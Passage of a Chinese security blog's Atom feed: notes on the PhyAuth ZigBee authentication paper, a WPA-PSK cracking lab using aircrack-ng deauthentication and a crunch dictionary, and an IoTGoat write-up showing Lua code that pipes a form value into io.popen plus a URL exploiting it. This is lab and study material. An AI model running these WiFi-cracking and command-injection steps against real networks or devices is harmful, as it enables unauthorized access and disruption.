<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>master&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-04-27T15:21:59.434Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Gardevoir</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PhyAUth论文学习记录</title>
    <link href="http://example.com/2023/04/27/PhyAUth%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/2023/04/27/PhyAUth%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2023-04-27T15:13:27.000Z</published>
    <updated>2023-04-27T15:21:59.434Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、研究背景"><a href="#一、研究背景" class="headerlink" title="一、研究背景"></a>一、研究背景</h1><h2 id="1、ZigBee介绍"><a href="#1、ZigBee介绍" class="headerlink" title="1、ZigBee介绍"></a>1、ZigBee介绍</h2><p>ZigBee是一种近距离、低复杂度、低功耗、低数据速率、低成本低双向无线通信技术，在物联网（IOT）中广泛使用。Zigbee的协议栈有4层，自低向上依次为物理层（PHY），媒体访问控制层（MAC）、网络层（NWK）、应用层（APL），其中APL又包括应用支持子层（APS）和ZigBee的设备对象（ZDO）。</p><p>ZigBee网络中包括三种类型的设备，协调器、路由器、终端。协调器负责启动网络和维护网络，路由节点负责转发数据包，而终端则负责发送和接受数据。一般，一个ZigBee网络中通常包含一个协调器和若干路由器以及终端。</p><span id="more"></span><p>​                              <img src="1.png" alt="1"></p><p>图1-1 ZigBee网络的拓扑图</p><p>在ZigBee中，数据包可以单点传送、多点传送或者广播传送，所以必须有地址模式参数。一个单点传送数据包只发送给一个设备，多点传送数据包则要传送给一组设备，广播数据包则要发送给整个网络的所有节点。目前ZigBee广泛应用于IOT的设备中，比如医疗设备的自动化控制、工厂的自动化设施、智能家居等。</p><h2 id="2、ZigBee中的安全措施"><a href="#2、ZigBee中的安全措施" class="headerlink" title="2、ZigBee中的安全措施"></a>2、ZigBee中的安全措施</h2><p>ZigBee在NWK和APL层之间定义了一种安全措施，该种安全措施中使用到了“link”key和“network”key。通常，在APL层对等实体之间的单播帧中使用128-bit的link key，而在广播/多播以及所有的NWK层帧中则使用network key。</p><p>如图1-2所示，在ZigBee的帧中，存在一个信息完整性码（MIC），每一个NWK帧都使用基于network key和128-bit AES-CCM算法的MIC进行加密以及认证。而对于APS帧，则能够根据帧的类型以及应用程序的需要而使用network key或link key。ZigBee让每个节点使用network key进行NWK MIC的验证，从而实现逐跳消息身份认证，相比之下，APS的MIC仅在端到端目的地的APS实体处进行验证。</p><p> <img src="2.png" alt="2"></p><p>图1-2 ZigBee中的安全措施</p><h2 id="3、ZigBee中的安全隐患"><a href="#3、ZigBee中的安全隐患" class="headerlink" title="3、ZigBee中的安全隐患"></a>3、ZigBee中的安全隐患</h2><p>ZigBee的安全措施并不是完美的，也存在一些安全隐患。比如基于共同network key的逐跳身份认证机制，就会很容易遭受分组注入攻击。在ZigBee的安全架构中，如果一个设备在转发的每个NWK帧中附带一个真实的MIC，那么它的邻居就会认为它拥有正确的network key，并认为改设备是合法的。因此，攻击者可以先嗅探那些合法的设备或者一些随机地址的设备，来获取有效的MIC，再和伪造的内容组合一起注入到NWK帧中，从而实现攻击。</p><p>NWK帧可以被分为控制帧和数据帧，控制帧用于路由和网络的管理，数据帧携带APS层的数据信息。而NWK中包含APS层广播数据的控制帧和数据帧都仅使用network key进行身份认证，因此攻击者构建的虚假的分组可以以这些类型的帧作为攻击目标，从而导致错误的数据包被广泛的传播，对整个网络带来严重的破坏。即使一些携带APS层单播数据的NWK帧只能被基于端到端的link key的APS MIC来进行身份认证，攻击者伪造的数据包也能在目的地被检测出来存在问题，从而会耗费网络系统的资源，造成一定的影响。</p><h1 id="二、方法介绍"><a href="#二、方法介绍" class="headerlink" title="二、方法介绍"></a>二、方法介绍</h1><h2 id="1、PhyAuth介绍"><a href="#1、PhyAuth介绍" class="headerlink" title="1、PhyAuth介绍"></a>1、PhyAuth介绍</h2><p>考虑到ZigBee目前的安全问题是由于其身份认证依赖的密钥较为单一，很容易被截获进而伪造分组，因此在论文中，提出了一种新的身份认证的方法—PhyAuth。PhyAuth的核心思想是让每一个ZigBee发射设备使用它自己专用的密钥派生出一个PHY一次密码（POTP），再将其嵌入到PHY信号中。这样以来，验证设备可以通过ZigBee发射设备的PHY信号来获取POTP进行验证，这些验证设备可以是正常的ZigBee网络中的接受者或者是IDS系统。如果验证者发现了一个无效的POTP，那么它可以直接丢弃该NWK帧，从而避免错误帧的进一步传播；此外，验证者也可以向ZigBee网络的管理员发送警告信息，报告异常情况，这样管理员就可以快速的定位有问题的设备并进行处理。POTP的生成可以使用软件或硬件来运行任何标准的hash函数。</p><h2 id="2、PhyAuth的优点"><a href="#2、PhyAuth的优点" class="headerlink" title="2、PhyAuth的优点"></a>2、PhyAuth的优点</h2><p>PhyAuth具有一些优秀的特性，可以对分组注入攻击进行有效的防御。</p><p>（1）由于POTP使用的是设备专用的密钥，因此每个设备的的POTP是唯一的，攻击者只能使用通信中协商过的指定设备来注入分组，而不能像以前一样随意的选择设备进行注入。即使攻击者进行了攻击，管理员也可以很快的定位到有问题设备，从而防止伪造分组的传播。</p><p>（2）PhyAuth并没有修改ZigBee的NWK/APL/MAC层，而只是在PHY层进行一些额外的处理，因此PhyAuth具有更好的兼容性，只要支持ZigBee的标准协议，基本都能使用PhyAuth。</p><p>（3）PhyAuth并没有涉及到硬件的修改，它可以作为对PHY层进行处理的一个固件，并不断的进行更新。</p><p>（4）PhyAuth对于系统性能的消耗是可以忽略不记的。此外对于那些没有添加PhyAuth的设备，它们收到包含POTP的数据包也会像往常一样处理，而不会出现错误。</p><p>（5）PhyAuth对于伪造以及重复的POTP具有弹性。</p><p>（6）PhyAuth使用标准的散列函数进行计算，它的计算效率较高。</p><h2 id="3、PhyAuth的实现"><a href="#3、PhyAuth的实现" class="headerlink" title="3、PhyAuth的实现"></a>3、PhyAuth的实现</h2><p>（1）PhyAuth的工作流程</p><p>PhyAuth可以分为两个步骤：1）发送步骤，每一个进行包转发的合法的ZigBee发送设备，必须将POTP嵌入到PHY信号当中；2）接收步骤，每个ZigBee的接收设备都会充当验证者，从分组的PHY信号中提取并验证POTP，只有合法的POTP才会进行放行。</p><p>（2）POTP的生成和验证</p><p>POTP是授权ZigBee设备进行传输数据包的加密和不可伪造的二进制序列。</p><p>1）POTP的生成</p><p>POTP使用标准的ZigBee安全密钥，并通过结合HOTP算法和TOTP算法来构建POTP，这两种算法分别由RFC 4226和RFC 6238定义。HOTP和TOTP广泛的运用于双重身份认证系统，二者都使用一个密钥（定义为K），且该密钥K只被HOTP/TOTP生成器以及验证器所知道。</p><p>定义C为一个8字节的计数器，T为时间因子，Truncate为将HMAC值转换为HOTP/TOTP的函数，SN为802.15.4定义的MAC帧头部8位单调递增的序列号，则POTP的生成过程可以用以下公式表示：</p><p> <img src="8.png" alt="8"></p><p>在公式中，POTP的生成用到了三元组(T,SN,src_addr)，使得POTP的生成不仅会收到设备的影响，还会收到时间的影响，从而加强了HOTP的设备依赖性以及时间依赖性。HMAC可以使用任意标准的密码算法，例如AES-MMO、SHA-2等。</p><p>2）POTP的长度</p><p>为了能够有效的抵抗攻击，HOTP/TOTP的长度至少位31bit，所以POTP的长度也应该至少是这个大小，例如32/64/128位的长度。POTP的长度越大，对于攻击的抵抗力越强，但相关的开销也会越大。</p><p>3）时间步长的大小</p><p>时间因子T是一个整数，用于表示相对于初始Unix time—T0的步长。另X代表以秒为单位的时间步长，而T0是Unix time开始计数时的步长。X和T0都是系统参数并且必须安全传输给每一个ZigBee设备以及POTP验证者。则T的计算公式如下：</p><p> <img src="9.png" alt="9"></p><p>4）密钥K的选择</p><p>对于K，有三种选择。第一，K可以取自于ZigBee中共用的network key，这种方式虽然简单，但也给攻击者方便。第二，可以使用发送设备不同的信任中心（Trust Center）的link key来作为K，显然这种方式的安全行更高。第三，将K设置为发送设备和其邻居之间应用程序所共享的link key。</p><p>对于第三种方式，假设一个发送设备为i，它的邻居为j，发送设备和所有邻居共享的密钥为ki，而和每一个邻居j单独使用的密钥为ki,j。发送设备使用ki来生成POTP，而其邻居可以使用ki,j来从分组中获取POTP从而进行验证。可见，这种方式的密钥选择，更加的安全。</p><p>5）POTP的验证</p><p>另δ为两个ZigBee设备之间时间步长X归一化后可能的时钟偏移，Tc为当前时时间步长值。每一个POTP的验证者从PHY信号中取出POTP之后，对于T∈[Tc - δ, Tc + δ]，进行有效性的验证。首先检查MAC帧的序列号是否是在时间步长窗口T中所遇到的最大值，然后使用广播/单播中应用程序的key来获取发送设备的K，在用K去获取POTP 并检查它和之前获得的其他POTP是否相等。如果任何一个步骤出错，那么该POTP被认为是无效的；如果两个设备都出错了，则该POTP的发送设备被认为是非法的，验证者将会向管理员发出警告。</p><h2 id="3、POTP的编码和解码"><a href="#3、POTP的编码和解码" class="headerlink" title="3、POTP的编码和解码"></a>3、POTP的编码和解码</h2><p>（1）POTP编码</p><p>PhyAuth包含三种编码方案—VarChip、VarAmp以及VarPhase，对ZigBee PHY帧的不同特征进行分析来嵌入POTP。ZigBee使用IEEE 802.15.4 PHY层，该层探索直接序列扩频（DSSS）来提高对干扰和噪音的抗性； MAC层中每4bit的ZigBee符号都会分布到发射器上预定义的伪随机噪声序列（PN），VarChip方法中，用POTP来替换PN中的一些位置；此外ZigBee采用OQPSK来调制DSSS生成的PN序列，VarAmp方法通过增强或减弱OQPSK符号的振幅来嵌入POTP。最后，VarPhase方法则是通过预定义的参数来控制连续OQPSK信号之间的相位偏移来嵌入POTP。这三种方式都可以独立或联合在一起使用。</p><p>（2）POTP解码</p><p>VarChip：作为发送设备的一跳邻居，验证者从可能的嵌入位置提取POTP的序列，作为候选POTP进行验证。</p><p>VarAmp：验证者通过VarAmp的散列图来提取POTP。通过检查图中接收到的数据符号以及POTP散列点之间的距离来解码POTP。验证者将会确定最接近的每个接收符号的POTP散列点，然后将嵌入的POTP位解码为1或0.</p><p> <img src="3.png" alt="3"></p><p>图2-1 VarAmp方案中POTP的散列图</p><p>VarPhase：验证者通过检查接收到的连续复数之间的相移来解码POTP。如果相移比经验阈值大（小），则将嵌入的POTP位解码为1（或0）。</p><h1 id="三、效果描述"><a href="#三、效果描述" class="headerlink" title="三、效果描述"></a>三、效果描述</h1><h2 id="1、POTP解码性能"><a href="#1、POTP解码性能" class="headerlink" title="1、POTP解码性能"></a>1、POTP解码性能</h2><p>论文中首先对POTP的bit错误率（BER）进行分析。为了便于分析，假设信道具有平均零和功率谱密度（PSD）N0/2的辅助白高斯噪声（AWGN）。</p><p>在分析的过程中，以原始OQPSK的BER作为参照对象。原始OQSPSK的BER值为  ，根据VarChip的编码程序，其获得的POTP的BER与原始OQPSK是相等的，此外VarChip的data BER也等于该值。因此，论文中仅展示VarAmp和VarPhase的POTP和data 的BER值，如表3-1所示：</p><p>表3-1 POTP解码性能的分析结果</p><p><img src="10.png" alt="10"> </p><h2 id="2、通信-计算的开销和能耗"><a href="#2、通信-计算的开销和能耗" class="headerlink" title="2、通信/计算的开销和能耗"></a>2、通信/计算的开销和能耗</h2><p>除了建立应用程序link key的一次性分组外，PhyAuth不会引入额外的ZigBee流量，因此通信开销可以忽略不计。而计算的开销和能耗主要是由HMAC生成POTP的操作决定的，经过实验证明，对于流行的SimpleLink CC13x2/CC26x2 ZigBee设备中，使用128位密钥的AES-CCM和SHA-224能耗良好，耗时均小于0.05毫秒；而如果使用Arm Cortex-M4F软件进行AES-CCM和SHA-224操作，耗时均小于0.5毫米。无论是硬件还是软件，两种加密操作的平均电流均在3～4mA之间。与ZigBee原本的MIC验证方式进行比较，使用硬件的POTP能耗是其1.1倍，而使用软件的POTP能耗确实其0.8倍。由此可以判断，使用POTP带来的计算延迟和能耗与原本的MIC方式基本一样。但是，PhyAuth能够阻止虚假数据包的多跳传输，从而节省大量能耗，这也是其优点。</p><h2 id="3、安全性分析"><a href="#3、安全性分析" class="headerlink" title="3、安全性分析"></a>3、安全性分析</h2><p>首先对于external attacker，其并不知道目标ZigBee网络身份认证所用的network key。当PhyAuth没有配置时，显然攻击者并不能发送一个包含正确MIC的分组，因此不能通过逐跳的身份认证。而当PhyAuth配置后，攻击者必须要向PHT信号中嵌入伪造的POTP才能实现攻击。但只要POTP足够长，攻击者就几乎不能伪造POTP，假设POTP长度为L，则攻击者伪造的随机POTP正确率为1/2L，在L &gt;= 32的情况下，显然伪造成功的概率几乎为0。此外POTP的验证效率比原本的MIC验证更高，因此PhyAuth更有优势。</p><p>其次，考虑internal attacker，该攻击者已经突破了一个设备，假设为A，并获得了network key。当PhyAuth没有配置时，攻击者可以用获得的network key，发送伪造的分组。由于该分组是包含正确的MIC的，它可以顺利的经过逐跳身份认证并到达目的地。而当PhyAuth配置后，如果攻击者使用随机地址的设备（假设为B）发送分组，要想攻击成功，就必须在每一个伪造分组中加入正确的POTP，而这个成功概率仅为1/2L，几乎不可能成功，而这些伪造的分组会被B周围的邻居很快的识别出来；如果攻击者使用他已经入侵过的A发送分组，虽然能够携带正确POTP，即能够成功的经过身份认证，但由于攻击者固定了发送设备A，他便很容易被管理员识别出来。</p><p>此外，对于重复分组攻击，PhyAuth也同样具有较强的抵抗性。每一个POTP的产生依赖于发送设备的MAC地址，MAC帧序列号和时间因子。另外，生成POTP的link key是发送设备和它的一跳邻居所共享的，因此每一个POTP只能被用与发送设备和邻居之间。这些导致了攻击者不能重复利用同一个嗅探到POTP分组进行攻击。</p><p>综上可知，PhyAuth具有较强的安全性。</p><h2 id="4、性能评估"><a href="#4、性能评估" class="headerlink" title="4、性能评估"></a>4、性能评估</h2><p>论文中使用USRP实验，在不同的背景下对PhyAuth的三种方法进行性能评估。</p><p>（1）<strong>实验开始准备</strong></p><p>使用三个USRP设备作为硬件平台，通过修改IEE 802.15.4 PHY的开源代码，在GNU Radio上实现三个PhyAuth的方案（VarChip，VarAmp和VarPhase）。此外，在评估中使用三种具有代表性的物理环境，即实验室、走廊和公寓，如图3-1所示。</p><p> <img src="4.png" alt="4"></p><p>图3-1 三种代表性的物理环境</p><p>（2）<strong>性能指标</strong></p><p>论文中使用四个指标来评估性能：POTP比特的错误率—PBER、分组错误率PER、假阴率—FNR、假阳率—FPR。PBER用来评估三种方案中从接收的数据包解码POTP的性能；BER用来评估三种方案对正常接收/发生数据包的影响；FNR和FPR用来评估三种方案区分合法和伪造分组的能力。</p><p>（3）<strong>评估过程及结果</strong></p><p>在实验中，让ZigBee发送设备发送5000个数据包，其中的PHY信号中嵌入POTP。图3-2为三个方案的PBER性能，可以观察到，随着信噪比的从10分贝增加到20分贝，三种方案的PBER曲线都会减少，并且图中的四个曲线均彼此接近，可以得出距离对三种方案的影响忽略不计的结论。与VarChip和VarAmp相比，VarPhase方案具有较低的PBER，当信噪比大于16分贝时，所有场景中VarPhase的PBER都低于10%，而当信噪比大于18分贝时三种方案的PBER都低于10%。这些结果均表明，三种方案都可以有效的提取和解码POTP，而VarPhase方案更加的优秀。</p><p> <img src="5.png" alt="5"></p><p>图3-2 PBER的分析结果</p><p>图3-3展示了三种方案中接收者的PER，由于VarAmp和VarPhase都可以降低BER，因此它们具有较低的PER值。另外，VarChip在低SNR低例子中可以提高PER，原因可能是VarChip使用POTP序列替换了一些PN序列中的位置，从而提高了分组的chip-error。但是当SNR超过18分贝时，VarChip对PER几乎没有负面影响。</p><p>  <img src="6.png" alt="6"></p><p>图3-3 PER的分析结果</p><p>对与三种方案的平均FNR，在实验中设置了一个阈值来确定解码的POTP是否有效。具体来说，如果解码的POTP BER值低于预定义的阈值，就可以认为接收的数据包是合法的，否则是假的。在三种方案中，将阈值设置为25%，可以看到，评价FNR随着SNR的增加而减少。而当信噪比高于14分贝时，三种方案的FNR都能低于1%，这些结果表明，三种方案可以有效的从合法数据包中提取和验证POTP。</p><p>论文中还用实验评估了三个方案的攻击弹性。使用一个USRP B210作为攻击者，并在没有任何POTP的情况下传输5000个数据包、使用假POTP和重传的有效POTP。而验证者则遵循PhyAuth协议，并从每个接收到的数据包中检测和解码POTP，计算出的PBER如图3-4所示（从左到右，依次为没有POTP的分组，伪造POTP的分组，重传的POTP的分组）。可以看到，所有攻击方案中从虚假分组中提取和解码的POTP的平均PBER高于45%，此外用相同的FNR设置来评估三个方案的FPR，得到三个方案的平均FPR低于0.01%的结果。种种迹象表明，三种方案对于伪造分组的检测具有很高的效果。</p><p>  <img src="7.png" alt="7"></p><p>图3-4 伪造分组中提取和解码的POTP的结果</p><p>综上，三个方案在各种SNR环境中的性能略有不同，但总体上差不多。实际中，可以将三种方案进行任意的组合，从而提高POTP的容错性。</p><h1 id="四、评价与思考"><a href="#四、评价与思考" class="headerlink" title="四、评价与思考"></a>四、评价与思考</h1><p>从论文所研究的内容来看。ZigBee作为IOT中重要的协议栈，其目前安全架构的不足，的确会带来巨大的安全隐患，使得非法分子可以对一些重要的设备进行攻击，从而破坏整个ZigBee网络。而物联网作为实现设备自动化操作的重要技术，ZigBee的安全隐患的确会带来不小的威胁，小至家庭中的一些智能家居，大至国家机密工厂的自动化加工。而论文正是针对ZigBee的身份认证安全问题，进行分析，从ZigBee的协议栈入手，找到一种合适的方式能够加强ZigBee的身份认证，使得既不会影响ZigBee的性能，又不失安全性，可谓两全其美。论文的最后，对于PhyAuth的性能分析，也毫无疑问证明了这种身份认证方法的优越性。此外，论文也充分分析了PhyAuth在各种场景下的发挥效果，以及PhyAuth的移植性问题，确保PhyAuth能够更加广泛的应用于各种ZigBee设备中。我认为，随着智能化的发展，物联网在未来必有巨大的发展潜能，PhyAuth对于ZigBee身份认证的加强，为物联网中安全问题做出了重大的贡献。</p><p>从论文中的研究过程来看，该篇论文也给了我一些思考。首先，如果要研究一个安全类的课题，要先选定目标，然后对目标涉及到的理论知识进行分析，比如研究ZigBee的身份认证之前，需要了解ZigBee协议栈道基本工作原理和身份认证的原理。其次，就需要对目标原有的安全架构进行分析，分析它有哪些安全隐患，并给出有力的证明，这样才更有说服性，并证明课题研究的必要性。而对于目标安全架构的研究，需要考虑的方面也有很多，不仅要考虑对原本安全性的提升，也要考虑对目标一些其他功能是否有影响，比如资源消耗问题等。在本文中就针对ZigBee设备数据包发送的能耗以及速率、数据包的错误率等进行了分析，全面的探讨了PhyAuth是否会对ZigBee设备原有性能造成影响，以及影响多少。最后，课题研究也应该注意提出的方法的移植性、适应性问题，比如在多个系统、设备上能否正常使用，在不同环境下是否正常的工作，这个是导致研究的方法最后是否实用的必要条件。</p><p>此外，对于身份认证这一技术也给了我一些启发，如果要研发一种身份认证的算法，可以针对密钥的选取，加密算法的使用等方面进行入手。考虑到现有的加密算法比较成熟，且新的加密算法的提出也不太容易，因此可以注重研究身份认证过程中使用到的密钥等参数信息，比如本文就结合ZigBee中的一些密钥以及时间、设备MAC地址等参数作为输入，用已有的加密算法进行计算，最终获得POTP。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;一、研究背景&quot;&gt;&lt;a href=&quot;#一、研究背景&quot; class=&quot;headerlink&quot; title=&quot;一、研究背景&quot;&gt;&lt;/a&gt;一、研究背景&lt;/h1&gt;&lt;h2 id=&quot;1、ZigBee介绍&quot;&gt;&lt;a href=&quot;#1、ZigBee介绍&quot; class=&quot;headerlink&quot; title=&quot;1、ZigBee介绍&quot;&gt;&lt;/a&gt;1、ZigBee介绍&lt;/h2&gt;&lt;p&gt;ZigBee是一种近距离、低复杂度、低功耗、低数据速率、低成本低双向无线通信技术，在物联网（IOT）中广泛使用。Zigbee的协议栈有4层，自低向上依次为物理层（PHY），媒体访问控制层（MAC）、网络层（NWK）、应用层（APL），其中APL又包括应用支持子层（APS）和ZigBee的设备对象（ZDO）。&lt;/p&gt;
&lt;p&gt;ZigBee网络中包括三种类型的设备，协调器、路由器、终端。协调器负责启动网络和维护网络，路由节点负责转发数据包，而终端则负责发送和接受数据。一般，一个ZigBee网络中通常包含一个协调器和若干路由器以及终端。&lt;/p&gt;</summary>
    
    
    
    <category term="物联网安全" scheme="http://example.com/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="身份认证" scheme="http://example.com/tags/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/"/>
    
    <category term="ZigBee" scheme="http://example.com/tags/ZigBee/"/>
    
  </entry>
  
  <entry>
    <title>WIFI密码破解</title>
    <link href="http://example.com/2023/04/10/WIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>http://example.com/2023/04/10/WIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2023-04-10T08:21:34.000Z</published>
    <updated>2023-04-10T08:39:32.990Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>利用Aircrack-ng套件破解WPA-PSK加密无线网络，了解WPA-PSK破解方法。</p><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>WPA（Wi-Fi Protected Access，Wi-Fi保护访问）的加密方式有两种，TKIP(Temporal KeyIntegrity Protocol，临时密钥完整协议)和AES-CCMP(Advanced Encryption Standard-CounterCBC-MAC Protocol，高级加密标准-计数器模式密码块链信息认证协议)。TKIP使用的算法仍是WEP采用的RC4算法，并在WEP密钥认证机制中添加了“信息包单加密功能”、“信息监测”、“具有序列功能的初始向量”和“密钥生成功能”等算法。但正是RC4加密方式的缺陷引起了大量安全问题。AES-CCMP没有再沿用WEP采用的RC4算法，它重新设计了Wi-Fi的加密方式，使用了AES这种迭代的、对称密钥分组的算法，没有TKIP所存在的大量潜在缺陷。</p><p>WPA认证机制有两种形式：WPA-PSK(WPA Pre-Shared Key，WPA的预共享密钥模式)以及WPA Enterprise(WPA的企业模式)，由于WPA Enterprise使用频率不高以及设备不足，本实验所说的WPA机制仅限于WPA Pre-Shared Key。在WPA-PSK机制中，其加密函数的输入是WPA的预共享密钥，无线网络接入点及客户端都知道该预共享密钥，预共享密钥（PSK）是8到63之间的ASCII字符。</p><span id="more"></span><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>首先开启热点Mate30 5G，用于充当目标AP进行攻击。</p><p>在kali-linux上执行以下命令，开启网卡的监控模式：</p><pre><code class="lang-shell">airmon-ng start wlan0ifconfig wlan0mon downiwconfig wlan0mon mode monitorifconfig wlan0mon upiwconfig wlan0mon</code></pre><p>然后输入airodump-ng wlan0mon进行wifi信号的嗅探，找到目标AP ”Mate30 5G“以及连接到它的设备：</p><p><img src="3.png" alt="3"></p><p>下面使用aireplay-ng进行DOS攻击，来获取WPA四次握手包，输入指令为aireplay-ng —deauth 8 -a &lt;热点的MAC&gt; -c &lt;连接的设备的MAC&gt; wlan0mon，但在此之前，需要输入以下命令来进行抓包：</p><pre><code class="lang-shell">airodump-ng -c &lt;AP的频道&gt; -w &lt;抓取握手包的存放位置&gt; --bssid &lt;AP的MAC地址&gt; &lt; monitor名称&gt;</code></pre><p>上面两条指令的目的在于抓到WAP的四次握手包，运行效果如下（左边为抓包，右边为DOS攻击）：</p><p><img src="1.png" alt="1"></p><p>最后使用aircrack-ng进行WPA-PSK的破解，用crunch工具生成一份字典：<code>crunch 10 10 qwert%%%%% &gt;&gt; pass.txt</code>，具体的字典生成可根据需要自行修改，比如指定正则表达式的结构等，在这里为了实验的方便，我设定密码的形式为前五位固定，后五位为数字。</p><p>然后输入<code>aircrack-ng -w pass.txt wpa2-01.cap</code>（此处的wpa2文件为抓包的保存文件），就可以对密码进行暴力的破解：</p><p><img src="2.png" alt="2"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;实验目的&quot;&gt;&lt;a href=&quot;#实验目的&quot; class=&quot;headerlink&quot; title=&quot;实验目的&quot;&gt;&lt;/a&gt;实验目的&lt;/h2&gt;&lt;p&gt;利用Aircrack-ng套件破解WPA-PSK加密无线网络，了解WPA-PSK破解方法。&lt;/p&gt;
&lt;h2 id=&quot;预备知识&quot;&gt;&lt;a href=&quot;#预备知识&quot; class=&quot;headerlink&quot; title=&quot;预备知识&quot;&gt;&lt;/a&gt;预备知识&lt;/h2&gt;&lt;p&gt;WPA（Wi-Fi Protected Access，Wi-Fi保护访问）的加密方式有两种，TKIP(Temporal KeyIntegrity Protocol，临时密钥完整协议)和AES-CCMP(Advanced Encryption Standard-CounterCBC-MAC Protocol，高级加密标准-计数器模式密码块链信息认证协议)。TKIP使用的算法仍是WEP采用的RC4算法，并在WEP密钥认证机制中添加了“信息包单加密功能”、“信息监测”、“具有序列功能的初始向量”和“密钥生成功能”等算法。但正是RC4加密方式的缺陷引起了大量安全问题。AES-CCMP没有再沿用WEP采用的RC4算法，它重新设计了Wi-Fi的加密方式，使用了AES这种迭代的、对称密钥分组的算法，没有TKIP所存在的大量潜在缺陷。&lt;/p&gt;
&lt;p&gt;WPA认证机制有两种形式：WPA-PSK(WPA Pre-Shared Key，WPA的预共享密钥模式)以及WPA Enterprise(WPA的企业模式)，由于WPA Enterprise使用频率不高以及设备不足，本实验所说的WPA机制仅限于WPA Pre-Shared Key。在WPA-PSK机制中，其加密函数的输入是WPA的预共享密钥，无线网络接入点及客户端都知道该预共享密钥，预共享密钥（PSK）是8到63之间的ASCII字符。&lt;/p&gt;</summary>
    
    
    
    <category term="无线网络安全" scheme="http://example.com/categories/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="wifi安全" scheme="http://example.com/tags/wifi%E5%AE%89%E5%85%A8/"/>
    
    <category term="WPA-PSK" scheme="http://example.com/tags/WPA-PSK/"/>
    
    <category term="aircrack-ng" scheme="http://example.com/tags/aircrack-ng/"/>
    
  </entry>
  
  <entry>
    <title>IotGoat漏洞挖掘--Web注入</title>
    <link href="http://example.com/2023/04/09/IotGoat%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-Web%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2023/04/09/IotGoat%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-Web%E6%B3%A8%E5%85%A5/</id>
    <published>2023-04-09T14:27:24.000Z</published>
    <updated>2023-04-09T15:03:48.802Z</updated>
    
    <content type="html"><![CDATA[<p>靶机：IotGoat</p><p><a href="https://github.com/OWASP/IoTGoat">https://github.com/OWASP/IoTGoat</a></p><p>本次实验通过对IotGoat进行分析，针对其众多漏洞中的一个web漏洞，实现注入的目的，从而达到攻击的目的。</p><span id="more"></span><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先用binwalk工具对IotGoat固件进行解包，得到固件的文件系统：<br><img src="1.png" alt="1"></p><p>通过对文件的分析，或者使用firmwalker工具进行自动化的分析，可以知道该固件具有哪些服务，比如ssh、http、https等。用虚拟机启动靶机，根据提示打开web界面，发现网址链接为<a href="https://192.168.43.168:9443/cgi-bin/luci。">https://192.168.43.168:9443/cgi-bin/luci。</a></p><p>接着通过find指令找到luci的文件，发现如下代码段：</p><pre><code class="lang-lua">require &quot;luci.cacheloader&quot;require &quot;luci.sgi.cgi&quot;luci.dispatcher.indexcache = &quot;/tmp/luci-indexcache&quot;luci.sgi.cgi.run()</code></pre><p>搜索<code>/tmp/luci-indexcache</code>但并没有任何发现，但是我们可以注意到该代码里面引用的都是luci的文件，因此可以将重点集中在usr/lib/lua/luci文件夹下。</p><p>经过搜寻发现controller的文件夹，可能包含一些控制信息，于是就发现了如下代码：</p><pre><code class="lang-lua">module(&quot;luci.controller.iotgoat.iotgoat&quot;, package.seeall)local http = require(&quot;luci.http&quot;)function index()    entry(&#123;&quot;admin&quot;, &quot;iotgoat&quot;&#125;, firstchild(), &quot;IoTGoat&quot;, 60).dependent=false    entry(&#123;&quot;admin&quot;, &quot;iotgoat&quot;, &quot;cmdinject&quot;&#125;, template(&quot;iotgoat/cmd&quot;), &quot;&quot;, 1)    entry(&#123;&quot;admin&quot;, &quot;iotgoat&quot;, &quot;cam&quot;&#125;, template(&quot;iotgoat/camera&quot;), &quot;Camera&quot;, 2)    entry(&#123;&quot;admin&quot;, &quot;iotgoat&quot;, &quot;door&quot;&#125;, template(&quot;iotgoat/door&quot;), &quot;Doorlock&quot;, 3)    entry(&#123;&quot;admin&quot;, &quot;iotgoat&quot;, &quot;webcmd&quot;&#125;, call(&quot;webcmd&quot;))endfunction webcmd()    local cmd = http.formvalue(&quot;cmd&quot;)    if cmd then        local fp = io.popen(tostring(cmd)..&quot; 2&gt;&amp;1&quot;)        local result =  fp:read(&quot;*a&quot;)        fp:close()        result = result:gsub(&quot;&lt;&quot;, &quot;&amp;lt;&quot;)        http.write(tostring(result))    else        http.write_json(http.formvalue())    endend</code></pre><p>不难看出，webcmd可能是运行一些系统中命令的函数，于是在浏览器中输入:<a href="https://192.168.43.168:9443/cgi-bin/luci/admin/iotgoat/webcmd?cmd=ls，得到以下信息：">https://192.168.43.168:9443/cgi-bin/luci/admin/iotgoat/webcmd?cmd=ls，得到以下信息：</a></p><p><img src="2.png" alt="2"></p><p>可以看见的是，我们成功在目标靶机上运行了ls指令，那么只要在cmd后输入相关的指令，目标靶机也会成功的执行，至此实现了简单的web注入。</p><h2 id="漏洞的应用"><a href="#漏洞的应用" class="headerlink" 